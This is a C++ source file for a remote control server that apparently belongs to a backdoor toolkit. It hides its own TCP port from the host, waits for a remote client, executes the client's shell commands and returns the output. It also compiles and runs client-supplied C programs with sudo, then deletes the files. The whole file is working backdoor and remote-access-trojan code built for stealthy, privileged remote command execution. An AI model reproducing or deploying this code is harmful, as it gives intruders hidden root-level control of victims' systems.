#include <thread>
#include <iostream>
#include <unistd.h>
#include <cstring>
#include <fcntl.h>

#include "remote_control_server.h"

#include "../network_access/linux_server.h"

#include "../../basic/network/basic_network_access.h"
#include "../hider/hider.h"
#include "../../basic/shell/basic_cli_shell_access.h"

#include "protocol.h"

#include "../error_codes.h"

void remote_control_server::run() {

    hide_tcp4_port(my_port);
    open_tcp_port(my_port);

    // create a tcp port listener
    linux_server my_listener;

    // assign the connection establisher for the listener
    my_listener.setConnectionEstablisher(generate_tcp_port_connection_establisher(my_port));

    int no_connections = 0;

    std::thread listen_thread([&my_listener, &no_connections]() {
        while (1) {
            if (no_connections >= 1) break; // todo: if the remove controller is expected to connect more than once, don't break here and keep looping

            std::cout << "waiting for a client..." << std::endl;
            my_listener.accept_next_client();
            no_connections++;

            std::cout << "client connection established" << std::endl;

            while (my_listener.is_client_connected()) {
                sleep(1);
            }

            std::cout << "client connection closed" << std::endl;

        }
    });
    while (true) {
        while (!my_listener.is_client_connected()) {
            if (no_connections >= 1) goto stop_server; // todo: same with here
            sleep(1);
        }

        const std::unique_ptr<basic_client_handler>& client = my_listener.get_connected_client();
        if (client == nullptr) continue;

        // get command
        R_OPER oper;
        memset(&oper, '\x00', sizeof(oper));
        client->recv_data(reinterpret_cast<char *>(&oper),
                                                      sizeof(oper));
        std::cout << "received message: ";

        switch (oper) {
            case R_OPER_DISCONNECT: {
                std::cout << "client is disconnecting" << std::endl;
                my_listener.close_curr_client();
                continue;
            }
            case R_OPER_EXEC_SHELL_COMMAND: {
                R_OPER_SHELL_COMAMND_SZ comamnd_len;
                client->recv_data(reinterpret_cast<char *>(&comamnd_len),
                                  sizeof(comamnd_len));

                std::string command(comamnd_len, '\x00');
                client->recv_data(reinterpret_cast<char *>(command.data()),
                                  comamnd_len);

                std::cout << "client shell command: " << command << std::endl;

                // execute
                std::string output = execute_cli_shell_command(command);
                std::cout << "command output:" << std::endl;
                std::cout << output << std::endl;

                // send the command's output back to linux_client
                R_OPER_SHELL_COMAMND_OUTPUT_SZ output_len = output.length();
                my_listener.get_connected_client()->send_data(reinterpret_cast<const char *>(&output_len),
                                                              sizeof(output_len));

                my_listener.get_connected_client()->send_data(reinterpret_cast<const char *>(output.data()),
                                                              output_len);

                break;
            }
            case R_OPER_EXEC_C_PROGRAM: {
                R_OPER_C_PROGRAM_SZ program_sz;
                client->recv_data(reinterpret_cast<char *>(&program_sz),
                                  sizeof(program_sz));

                std::string program(program_sz, '\x00');
                client->recv_data(reinterpret_cast<char *>(program.data()),
                                  program_sz);

                std::cout << "executing c program: " << std::endl;
                std::cout << program << std::endl;

                // create the c file
                std::cout << "creating file..." << std::endl;
#define PROGRAM_FILE "./file.c"
                int fd = open(PROGRAM_FILE, O_RDWR | O_CREAT);
                if (fd == OPEN_ERROR)
                    break;

                write(fd, program.data(), program_sz);

                close(fd);

                // compile
                std::cout << "compiling..." << std::endl;
                system("sudo gcc " PROGRAM_FILE " -o file.out");

                // execute
                std::cout << "executing..." << std::endl;
#define BUILD_FILE "./file.out"
                system("sudo " BUILD_FILE);

                // removing file
                system("sudo rm " PROGRAM_FILE " " BUILD_FILE);

                break;
            }
            default: {
                std::cout << "bad remote operation id" << std::endl;
                break;
            }
        }

    }

    stop_server:
    {
        listen_thread.join();
        stop();
    }
}

void remote_control_server::stop() {
    close_tcp_port(my_port);
    unhide_tcp4_port(my_port);
}
